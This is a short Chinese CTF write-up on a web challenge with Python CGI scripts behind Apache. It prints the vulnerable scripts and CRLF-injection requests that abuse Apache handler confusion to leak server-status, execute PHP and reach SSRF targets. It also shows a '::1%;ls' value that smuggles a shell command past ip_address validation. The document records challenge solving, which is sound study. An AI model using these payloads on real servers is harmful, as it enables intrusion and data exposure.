# web


### Cyber Attack
python cgi下就俩个接口，一个限制127.0.0.1

```PYTHON
import cgi
import os
import re

def is_domain(target):
    return re.match(r'^(?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.[a-zA-Z]{2,63}$', target)

form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')
if not name or not target:
    print('Location: ../?error=Hey, you need to provide a name and a target!')
    
elif is_domain(target):
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {target}') 
    print(f'Location: ../?result=Succesfully attacked {target}!')
    #存在crlf注入
else:
    print(f'Location: ../?error=Hey {name}, watch it!')
    
print('Content-Type: text/html')
print()
```

```python
#!/usr/bin/env python3

import cgi
import os
from ipaddress import ip_address

form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')

if not name or not target:
    print('Location: ../?error=Hey, you need to provide a name and a target!')
try:
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {ip_address(target)}') 
    print(f'Location: ../?result=Succesfully attacked {target}!')
except:
    print(f'Location: ../?error=Hey {name}, watch it!')
    
print('Content-Type: text/html')
print()

```

一个正则，一个ip_address感觉都限制死了,感觉ssrf也没用。。

apache配置.php文件解析，能否让cgi解析为php？

```
AddType application/x-httpd-php .php
```

`/index.php/../cgi-bin/attack-domain?name=<?php phpinfo();&target=<?php phpinfo();`
还是不行

---
https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%F0%9F%94%A5-3-Handler-Confusion

apache配置文件里的add type配合crlf攻击可以实现ssrf
原因是apache使用r->content-type时，没有辨别语义，这个值可以是请求阶段设置的，也可以是响应头的值
通过cgi的本地重定向响应
即通过控制响应content-type头，调用apache内部handler

敏感信息
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```


```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/uploads/avatar.webp %0d%0a
Content-Type:application/x-httpd-php %0d%0a
%0d%0a
```

ssrf
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:http://example.com/%3F %0d%0a
%0d%0a
```

最后是ip_address的绕过

```python
#<zone_id>是一个附加信息，表示特定的网络接口或作用域。它用%符号后跟区域标识符来表示，例如fe80::a%en1，其中en1是网络接口的名称。
from ipaddress import ip_address

print(ip_address("::1%;ls"))
```
# reverse

# pwn

# crypto

# Misc


---
# *相关wp*
https://github.com/hackthebox/cyber-apocalypse-2025



2025-03-22   01:34